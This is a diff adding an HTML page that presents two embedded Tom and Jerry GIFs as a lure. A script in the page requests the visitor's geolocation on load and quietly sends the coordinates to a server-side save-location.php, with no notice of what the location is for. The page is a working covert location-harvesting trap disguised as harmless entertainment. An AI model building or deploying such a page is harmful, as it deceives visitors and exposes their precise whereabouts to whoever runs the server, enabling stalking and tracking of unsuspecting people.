@@ -1,0 +1,26 @@
+
+<html>
+    <body onload="getLocation()">
+    <iframe src="https://giphy.com/embed/11J027GnyjrcJi" width="480" height="368" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/tom-and-jerry-cat-dancing-11J027GnyjrcJi"></a></p>
+<iframe src="https://giphy.com/embed/y9QemIlaYYWdi" width="480" height="353" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/1947-joseph-barbera-tom-cat-y9QemIlaYYWdi"></a></p><html>
+    <p id="demo"></p>
+    
+    <script>
+    var x = document.getElementById("demo");
+    function getLocation() {
+        if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+    
+    function showPosition(position) {
+ const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "save-location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+xhttp.send();
+    }
+    </script>
+    
+    </body>
+    </html>
